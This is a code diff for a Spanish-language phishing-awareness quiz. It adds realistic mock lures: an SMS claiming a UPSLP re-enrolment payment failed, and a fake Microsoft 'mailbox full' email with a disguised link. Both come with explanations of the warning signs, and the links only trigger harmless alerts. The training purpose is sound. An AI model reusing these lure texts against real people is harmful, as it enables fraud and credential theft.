     content: `<strong>De:</strong> +52 444 123 4567 (Mensajería UPSLP)<br>
               <strong>Asunto:</strong> [URGENTE] Aviso de Control Escolar<br><br>
               <div style="max-width: 300px; margin: 0 auto; background-color: #e5e5ea; padding: 15px; border-radius: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica; position: relative;">
                 <p style="margin: 0; font-size: 14px; color: #000;">
                     UPSLP ADVIERTE: Tu pago de reinscripción para el periodo Primavera 2026 no ha sido procesado. 
                     Evita la baja definitiva validando tu comprobante aquí: 
-                    <span style="color: #007aff; text-decoration: underline;">https://bit.ly/upslp-pagos-2026</span>
+                    <a href="#" 
+                    title="https://bit.ly/upslp-pagos-2026"
+                    onclick="alert('⚠️ Simulación de phishing')" 
+                    style="color: #007aff; text-decoration: underline;">
+                    https://upslp.edu.mx/pagos
+                    </a>
                 </p>
                 <small style="display: block; margin-top: 10px; color: #8e8e93; font-size: 10px; text-align: center;">Hoy 14:20</small>
               </div>
               <br>
               <p class="text-center text-muted" style="font-size: 12px;"><i>* Simulación de mensaje de texto recibido en dispositivo móvil *</i></p>`,
-    senderLogoUrl: "https://cdn-icons-png.flaticon.com/512/3616/3616215.png", // Icono de mensaje o alerta
+    senderLogoUrl: "https://cdn-icons-png.flaticon.com/512/3616/3616215.png",
     isPhishing: true,
-    feedback: "¡Cuidado con el Smishing! <br>1. Las instituciones oficiales <strong>rara vez</strong> usan acortadores de links como <em>bit.ly</em> para temas financieros. <br>2. El uso de amenazas como 'Baja definitiva' es una táctica de <strong>extrema urgencia</strong> para que no pienses. <br>3. Aunque el número tenga lada de San Luis (444), es muy fácil de falsificar. Siempre verifica directamente en el portal oficial de la Politécnica."
+
+    explanation: `
+🚨 <strong>Smishing (phishing por SMS)</strong><br><br>
+
+Este tipo de ataque utiliza mensajes de texto para engañar al usuario.<br><br>
+
+🔎 <strong>Señales de alerta:</strong><br><br>
+
+<strong>1. Enlace acortado:</strong><br>
+El uso de <code>bit.ly</code> oculta la URL real. Las instituciones oficiales no usan acortadores para pagos.<br><br>
+
+<strong>2. Urgencia extrema:</strong><br>
+La amenaza de <strong>"baja definitiva"</strong> busca generar pánico y acción inmediata.<br><br>
+
+<strong>3. Remitente manipulable:</strong><br>
+Los números telefónicos pueden ser fácilmente falsificados (spoofing), incluso con lada local (444).<br><br>
+
+<strong>4. Canal no oficial:</strong><br>
+Las instituciones educativas no gestionan pagos importantes a través de SMS.<br><br>
+
+<strong>5. Ingeniería social:</strong><br>
+El contexto académico (reinscripción) aumenta la probabilidad de que el usuario caiga.<br><br>
+
+<strong>6. Enlace disfrazado:</strong><br>
+El texto del enlace muestra una URL confiable, pero el destino real es diferente.
+
+⚠️ <strong>Buena práctica:</strong><br>
+Nunca accedas a enlaces de pago desde mensajes SMS. Ingresa directamente al portal oficial.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este mensaje intenta robar información o dinero mediante engaño. Es un claro caso de <strong>smishing</strong>.
+`
 },
 //Escenario 10: Spear Phishing
 {
-    title: "Alerta de Almacenamiento Lleno",
+    title: "📦 Alerta de Almacenamiento Lleno",
     content: `<strong>De:</strong> msa-noreply@microsoft-storage-service.net<br>
               <strong>Asunto:</strong> Acción Requerida: Tu buzón de correo está lleno y ha dejado de recibir mensajes<br><br>
               <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; border: 1px solid #e1e1e1; background-color: #ffffff;">
@@ -359,7 +675,15 @@ const scenarios = [
                     <strong>Estado actual:</strong> Los mensajes entrantes están siendo rechazados y devueltos al remitente.
                 </div>
                 <p style="font-size: 14px;">Para seguir recibiendo correos, debes validar tu cuenta y solicitar una extensión de almacenamiento temporal:</p>
-                <a href="#" style="background-color: #d83b01; color: white; padding: 12px 25px; text-decoration: none; display: inline-block; font-weight: 600; border-radius: 2px;">Aumentar Almacenamiento Gratis</a>
+
+                <!-- LINK ENGAÑOSO -->
+                <a href="#" 
+                   title="https://microsoft-storage-service.net/upgrade"
+                   onclick="alert('⚠️ Simulación: este enlace sería malicioso')" 
+                   style="background-color: #d83b01; color: white; padding: 12px 25px; text-decoration: none; display: inline-block; font-weight: 600; border-radius: 2px;">
+                   Aumentar Almacenamiento Gratis
+                </a>
+
                 <br><br>
                 <p style="font-size: 12px; color: #666;">
                     © 2026 Microsoft Corporation. Todos los derechos reservados.<br>
@@ -368,13 +692,47 @@ const scenarios = [
               </div>`,
     senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg",
     isPhishing: true,
-    feedback: "¡Finalizado! Este fue un <strong>Caso Real</strong>. <br>1. El dominio <em>microsoft-storage-service.net</em> es falso; Microsoft usa dominios internos para el almacenamiento. <br>2. El color naranja y la amenaza de 'correos rechazados' crean un pánico técnico que nubla el juicio. <br>3. Al ser un usuario institucional, sabes que el almacenamiento lo gestiona la UPSLP, no un servicio externo de Microsoft. ¡Has completado el entrenamiento!"
+
+    explanation: `
+🚨 <strong>Phishing avanzado (caso real)</strong><br><br>
+
+Este tipo de correo es altamente efectivo porque imita alertas técnicas legítimas.<br><br>
+
+🔎 <strong>Señales de alerta:</strong><br><br>
+
+<strong>1. Dominio falso:</strong><br>
+El remitente usa <code>microsoft-storage-service.net</code>, que no pertenece a Microsoft.<br><br>
+
+<strong>2. Urgencia técnica:</strong><br>
+El mensaje indica que tu correo dejará de funcionar, generando presión inmediata.<br><br>
+
+<strong>3. Botón de acción:</strong><br>
+El botón <strong>"Aumentar almacenamiento"</strong> normalmente redirige a una página falsa para robar credenciales.<br><br>
+
+<strong>4. Contexto creíble:</strong><br>
+El uso de tu correo institucional y límites de almacenamiento hace el ataque más convincente.<br><br>
+
+<strong>5. Ingeniería visual:</strong><br>
+El diseño, colores y logo de Microsoft generan confianza falsa.<br><br>
+
+<strong>6. Enlace oculto:</strong><br>
+Aunque el botón parece legítimo, el destino real no pertenece a Microsoft.<br><br>
+
+⚠️ <strong>Buena práctica:</strong><br>
+Nunca accedas a enlaces de este tipo. Verifica directamente en el portal oficial de tu institución.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este es un ataque diseñado para robar credenciales aprovechando el miedo a perder acceso al correo.
+`
 }
 
 
 ];
 let currentStep = 0;
-
+   
+function handleFakeLogin() {
+    alert("⚠️ Simulación: tus credenciales habrían sido robadas");
+}
 function startQuiz() {
     document.getElementById('consent-box').classList.add('d-none');
     document.getElementById('quiz-container').classList.remove('d-none');
@@ -384,34 +742,53 @@ function startQuiz() {
 function showScenario() {
     const s = scenarios[currentStep];
     
-    // 1. Actualizar textos básicos
-    document.getElementById('question-number').innerText = `Mensaje ${currentStep + 1} de ${scenarios.length}`;
+    // 1. Número y título
+    document.getElementById('question-number').innerText = `Escenario ${currentStep + 1} de ${scenarios.length}`;
     document.getElementById('scenario-title').innerText = s.title;
     
-    // 2. Extraer y mostrar remitente
+    // 2. Remitente
     const senderMatch = s.content.match(/<strong>De:<\/strong> (.*?)<br>/);
-    document.getElementById('sender-info').innerText = senderMatch ? senderMatch[1] : "Remitente desconocido";
+    document.getElementById('sender-info').innerText = senderMatch 
+        ? senderMatch[1] 
+        : "Remitente desconocido";
     
-    // 3. Mostrar cuerpo del mensaje
-    const bodyContent = s.content.split('<br><br>')[1];
-    document.getElementById('email-content').innerHTML = bodyContent;
+    // 3. ASUNTO (AQUÍ VA LO TUYO ✅)
+    const subjectMatch = s.content.match(/<strong>Asunto:<\/strong> (.*?)<br>/);
+    document.getElementById('email-subject').innerText = subjectMatch 
+        ? "Asunto: " + subjectMatch[1] 
+        : "Sin asunto";
 
-    // 4. LÓGICA DE LA IMAGEN (CORREGIDA)
+    // 4. Cuerpo del mensaje
+// Buscamos donde termina el encabezado (Asunto) para separar el cuerpo
+const contentParts = s.content.split('<br><br>');
+// Eliminamos las primeras dos líneas (De y Asunto) para que no se repitan en el cuerpo
+const bodyContent = contentParts.slice(1).join('<br><br>'); 
+
+document.getElementById('email-content').innerHTML = `
+    <div style="margin-top: 15px; padding-top: 15px; border-top: 1px dashed #e1e1e1;">
+        ${bodyContent}
+    </div>
+`;
+
+    // 5. Imagen
     const imgElement = document.getElementById('sender-profile-img');
     const initialsElement = document.getElementById('sender-initials');
 
     if (s.senderLogoUrl) {
         imgElement.src = s.senderLogoUrl;
-        imgElement.classList.remove('d-none'); // Muestra la imagen
-        initialsElement.classList.add('d-none'); // Oculta el "?"
+        imgElement.classList.remove('d-none');
+        initialsElement.classList.add('d-none');
     } else {
         imgElement.classList.add('d-none');
         initialsElement.classList.remove('d-none');
         initialsElement.innerText = s.title.charAt(0).toUpperCase();
     }
-    
-    // 5. Resetear feedback y scroll
+
+    // 6. Reset
     document.getElementById('feedback').classList.add('d-none');
+    document.getElementById('btn-phishing').disabled = false;
+    document.getElementById('btn-safe').disabled = false;
+
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
@@ -419,16 +796,37 @@ function handleAnswer(userSaysPhishing) {
     const s = scenarios[currentStep];
     const feedbackDiv = document.getElementById('feedback');
     const alertDiv = document.getElementById('feedback-alert');
-    
+
+    const userAnswerText = userSaysPhishing ? "Es Phishing" : "Es Seguro";
+    const correctAnswerText = s.isPhishing ? "Es Phishing" : "Es Seguro";
+
+    // 🔒 Deshabilitar botones
+    document.getElementById('btn-phishing').disabled = true;
+    document.getElementById('btn-safe').disabled = true;
+
     feedbackDiv.classList.remove('d-none');
+
     if (userSaysPhishing === s.isPhishing) {
+        // ✅ CORRECTO
         alertDiv.className = "alert alert-success border-0 shadow";
-        document.getElementById('feedback-title').innerText = "✅ ¡Excelente Identificación!";
+        document.getElementById('feedback-title').innerText = "✅ Correcto";
+
+        document.getElementById('feedback-text').innerHTML = `
+        <strong>Tu respuesta:</strong> ${userAnswerText} ✔️<br>
+        <strong>Respuesta correcta:</strong> ${correctAnswerText}<br><br>
+        ${s.explanation}
+        `;
     } else {
-        alertDiv.className = "alert alert-warning border-0 shadow";
-        document.getElementById('feedback-title').innerText = "❌ Caíste en la trampa";
+        // ❌ ERROR
+        alertDiv.className = "alert alert-danger border-0 shadow";
+        document.getElementById('feedback-title').innerText = "❌ Error";
+
+        document.getElementById('feedback-text').innerHTML = `
+        <strong>Tu respuesta:</strong> ${userAnswerText} ❌<br>
+        <strong>Respuesta correcta:</strong> ${correctAnswerText} ✔️<br><br>
+        ${s.explanation}
+        `;
     }
-    document.getElementById('feedback-text').innerHTML = s.feedback;
 }
 
 function nextQuestion() {
